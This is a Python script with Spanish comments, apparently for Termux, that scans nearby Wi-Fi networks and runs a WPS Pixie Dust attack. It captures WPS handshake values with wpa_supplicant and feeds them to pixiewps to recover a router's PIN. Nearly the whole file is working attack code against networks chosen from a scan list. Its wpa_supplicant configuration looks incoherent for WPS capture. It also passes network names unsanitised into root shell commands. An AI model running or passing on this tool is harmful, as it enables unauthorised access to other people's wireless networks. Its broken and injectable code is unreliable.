import subprocess
import re
import os
import tempfile
from tabulate import tabulate

def run_command(command, use_sudo=False, timeout=None):
    """Ejecuta un comando de shell y muestra la salida en tiempo real"""
    if use_sudo:
        command = f"su -c '{command}'"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        stdout, stderr = process.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        process.kill()
        stdout, stderr = process.communicate()
        print("El comando ha excedido el tiempo de espera y ha sido terminado.")

    return stdout, stderr

def extract_value(output, key):
    """Extrae un valor de la salida del comando basado en una clave"""
    match = re.search(f"{key} ([0-9a-fA-F:]+)", output)
    return match.group(1) if match else None

def is_valid_bssid(bssid):
    """Verifica si un BSSID es válido"""
    return re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", bssid) is not None

def freq_to_channel(freq):
    """Convierte una frecuencia en MHz al número de canal correspondiente"""
    freq = int(freq)
    if 2412 <= freq <= 2472:
        return (freq - 2407) // 5
    elif freq == 2484:
        return 14
    elif 5180 <= freq <= 5825:
        return (freq - 5000) // 5
    else:
        return freq  # Devuelve la frecuencia si no se puede convertir

def scan_wifi(interface):
    """Escanear redes Wi-Fi cercanas utilizando la interfaz especificada"""
    print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
    resultado, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
    redes = []
    for bloque in resultado.split("BSS"):
        red = {}
        for linea in bloque.splitlines():
            if "SSID:" in linea:
                red["SSID"] = linea.split("SSID:")[1].strip()
            elif "freq:" in linea:
                red["Channel"] = freq_to_channel(int(linea.split("freq:")[1].strip()))
            elif "signal:" in linea:
                red["Signal"] = linea.split("signal:")[1].strip()
            elif "BSS" in linea:
                red["BSSID"] = linea.split()[1]
        if "SSID" in red and "BSSID" in red:
            redes.append(red)
    return redes

def create_wpa_supplicant_conf(ssid):
    """Crea un archivo de configuración temporal para wpa_supplicant"""
    conf_content = f"""
network={{
    ssid="{ssid}"
    key_mgmt=NONE
    scan_ssid=1
    proto=WPA RSN
    pairwise=CCMP TKIP
    group=CCMP TKIP
    eap=PEAP
    identity="anonymous"
    password="password"
}}
"""
    conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
    conf_file.write(conf_content)
    conf_file.close()
    return conf_file.name

def capture_wps_data(interface, ssid):
    """Captura los datos necesarios para el ataque Pixie Dust usando wpa_supplicant"""
    print(f"Capturando datos WPS de la red con SSID {ssid}...")
    conf_file = create_wpa_supplicant_conf(ssid)
    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"  # Ruta completa de wpa_supplicant
    wpa_supplicant_command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
    print(f"Ejecutando wpa_supplicant: {wpa_supplicant_command}")
    stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True, timeout=120)

    print("Salida de wpa_supplicant:")
    print(stdout)
    print(stderr)

    pke = extract_value(stdout, "PKE:")
    pkr = extract_value(stdout, "PKR:")
    ehash1 = extract_value(stdout, "E-Hash1:")
    ehash2 = extract_value(stdout, "E-Hash2:")
    authkey = extract_value(stdout, "AuthKey:")
    enonce = extract_value(stdout, "E-Nonce:")

    os.remove(conf_file)  # Eliminar el archivo de configuración temporal

    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar todos los datos necesarios para el ataque Pixie Dust.")
        return None, None, None, None, None, None

    return pke, pkr, ehash1, ehash2, authkey, enonce

def perform_pixie_dust_attack(interface, ssid):
    """Realiza el ataque Pixie Dust usando los datos de wpa_supplicant."""
    print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")

    # Capturar los datos necesarios usando wpa_supplicant
    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, ssid)
    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
        return

    # Mostrar las claves capturadas
    print("\n--- Claves capturadas ---")
    print(f"PKE: {pke}")
    print(f"PKR: {pkr}")
    print(f"E-Hash1: {ehash1}")
    print(f"E-Hash2: {ehash2}")
    print(f"AuthKey: {authkey}")
    print(f"E-Nonce: {enonce}")
    print("-------------------------")

    # Ejecutar pixiewps con los valores capturados
    pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
    print(f"Ejecutando pixiewps: {pixiewps_command}")
    process = subprocess.Popen(pixiewps_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    for line in process.stdout:
        print(line.strip())  # Mostrar la salida de pixiewps en tiempo real

    pixie_stdout, pixie_stderr = process.communicate()

    print("\n--- Salida de pixiewps ---")
    print(pixie_stdout)
    print(pixie_stderr)

    if "WPS pin:" in pixie_stdout:
        pin = extract_value(pixie_stdout, "WPS pin:")
        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
        return pin
    else:
        print("\nPixie Dust no pudo encontrar el PIN.")
        return None

def main():
    os.system('clear')

    # Verificar herramientas necesarias
    tools = ["iw", "wpa_supplicant", "pixiewps"]
    for tool in tools:
        if not subprocess.run(["which", tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            print(f"Error: {tool} no está disponible en el sistema.")
            return

    scan_interface = "wlan1"

    redes = scan_wifi(scan_interface)
    if redes:
        print("Redes disponibles:")
        table = [[i + 1, n.get("SSID", "<SSID oculto>"), n["BSSID"], n["Channel"], n["Signal"]] for i, n in enumerate(redes)]
        print(tabulate(table, headers=["#", "SSID", "BSSID", "Canal", "Intensidad"], tablefmt="grid"))

        try:
            seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
            if seleccion < 0 or seleccion >= len(redes):
                print("Selección inválida.")
                return

            red_seleccionada = redes[seleccion]
            perform_pixie_dust_attack(scan_interface, red_seleccionada.get("SSID", "<SSID oculto>"))
        except ValueError:
            print("Entrada inválida.")
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()
